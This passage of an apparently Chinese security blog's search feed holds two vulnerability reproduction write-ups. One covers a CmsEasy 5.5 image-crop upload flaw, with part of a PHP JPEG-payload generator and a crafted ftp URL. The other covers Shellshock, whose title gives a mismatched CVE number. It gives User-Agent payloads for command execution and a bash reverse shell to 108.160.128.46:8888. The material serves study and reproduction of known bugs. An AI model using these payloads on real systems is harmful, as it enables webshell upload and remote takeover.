elseif($correctImage) {                $outStream = $outStreamTmp;            } else {                break;            }            if(checkImage('payload_'.$argv[1], $outStream)) {                die('Success!');            } else {                break;            }        }    }}unlink('payload_'.$argv[1]);die('Something\'s wrong');function checkImage($filename, $data, $unlink = FALSE) {    global $correctImage;    file_put_contents($filename, $data);    $correctImage = TRUE;    imagecreatefromjpeg($filename);    if($unlink)        unlink($filename);    return $correctImage;}function custom_error_handler($errno, $errstr, $errfile, $errline) {    global $extraBytes, $correctImage;    $correctImage = FALSE;    if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {        if(isset($m[1])) {            $extraBytes = (int)$m[1];        }    }}class DataInputStream {    private $binData;    private $order;    private $size;    public function __construct($filename, $order = false, $fromString = false) {        $this-&gt;binData = '';        $this-&gt;order = $order;        if(!$fromString) {            if(!file_exists($filename) || !is_file($filename))                die('File not exists ['.$filename.']');            $this-&gt;binData = file_get_contents($filename);        } else {            $this-&gt;binData = $filename;        }        $this-&gt;size = strlen($this-&gt;binData);    }    public function seek() {        return ($this-&gt;size - strlen($this-&gt;binData));    }    public function skip($skip) {        $this-&gt;binData = substr($this-&gt;binData, $skip);    }    public function readByte() {        if($this-&gt;eof()) {            die('End Of File');        }        $byte = substr($this-&gt;binData, 0, 1);        $this-&gt;binData = substr($this-&gt;binData, 1);        return ord($byte);    }    public function readShort() {        if(strlen($this-&gt;binData) &lt; 2) {            die('End Of File');        }        $short = substr($this-&gt;binData, 0, 2);        $this-&gt;binData = substr($this-&gt;binData, 2);        if($this-&gt;order) {            $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);        } else {            $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);        }        return $short;    }    public function eof() {        return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);    }}</code></pre><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>漏洞点在CmsEasy5.5/lib/default/tool_act.php 392行的cut_image_action()函数</p><pre><code>function cut_image_action() {    $len = 1;    if(config::get('base_url') != '/'){        $len = strlen(config::get('base_url'))+1;    }    if(substr($_POST['pic'],0,4) == 'http'){        front::$post['thumb'] = str_ireplace(config::get('site_url'),'',$_POST['pic']);    }else{        front::$post['thumb'] = substr($_POST['pic'],$len);    }    $thumb=new thumb();    $thumb-&gt;set(front::$post['thumb'],'jpg');    $img=$thumb-&gt;create_image($thumb-&gt;im,$_POST['w'],$_POST['h'],0,0,$_POST['x1'],$_POST['y1'],$_POST['x2'] -$_POST['x1'],$_POST['y2'$new_name=$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',$_POST['pic']));    $save_file='upload/images/'.date('Ym').'/'.$new_name;    @mkdir(dirname(ROOT.'/'.$save_file));    ob_start();    $thumb-&gt;out_image($img,null,85);    file_put_contents(ROOT.'/'.$save_file,ob_get_contents());    ob_end_clean();    $image_url=config::get('base_url').'/'.$save_file;    //$res['size']=ceil(strlen($img) / 1024);    $res['code']="                    //$('#cut_preview').attr('src','$image_url');                    $('#thumb').val('$image_url');                    alert(lang('save_success'));    ";    echo json::encode($res);}</code></pre><p>在这段代码里将上传的文件重新命名，没有对后缀进行限制，允许了php文件上传</p><pre><code>\$new_name=\$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',\$_POST['pic']));</code></pre><p>因此需构造经php图像库处理后仍能保持shell语句，且通过file_exists函数的验证（php5.0后可以用ftp协议加载图片）</p><p>这段代码决定图片的ftp地址前需要补位，若此时<code>pic=ftp://108.160.128.46/payload_image.php</code>,则<code>front::\$post['thumb'] = substr(\$_POST['pic'],$len)= substr(\$_POST['pic'],1)</code>,因此需要构造<code>pic=1ftp://108.160.128.46/payload_image.php</code>才能正好取到远程图片，相应地，站点不是放在根目录，则需要补位strlen(base_url)+2</p><pre><code>if(config::get('base_url') != '/'){    $len = strlen(config::get('base_url'))+1;}if(substr($_POST['pic'],0,4) == 'http'){    front::$post['thumb'] = str_ireplace(config::get('site_url'),'',$_POST['pic']);}else{    front::$post['thumb'] = substr($_POST['pic'],$len);}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>破壳漏洞（CVE-2014-4217）</title>
      <link href="/2020/11/09/cve-2014-6271/"/>
      <url>/2020/11/09/cve-2014-6271/</url>
      
        <content type="html"><![CDATA[<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>访问<a href="http://ip:port/cgi-bin/poc.cgi,修改UA字段执行命令" target="_blank" rel="noopener">http://ip:port/cgi-bin/poc.cgi,修改UA字段执行命令</a><br>命令执行：User-Agent: () { :;};echo ; echo; echo $(/bin/ls -al /);<br>反弹shell：User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/108.160.128.46/8888 0&gt;&amp;1;<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/0dda8ca45ef31539.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/b77a81a4751b0af8.png" alt=""></p><p>注意：部分嵌入式设备的环境变量未设置会导致一些命令需要使用绝对路径，可在执行命令前导入环境变量。</p><pre><code>User-Agent: () { :;};echo ; echo; export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo $(/bin/ls -al /);</code></pre><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>旧版本Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。主要原因在于输入过滤中没有严格限制边界，也没有做出合法化的参数判断。<br>此漏洞属于Bash漏洞，本身并不能导致远程代码执行，需要在第三方服务程序作为媒介，如apache2的CGI组件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/news/48331.html" target="_blank" rel="noopener">https://www.freebuf.com/news/48331.html</a><br><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
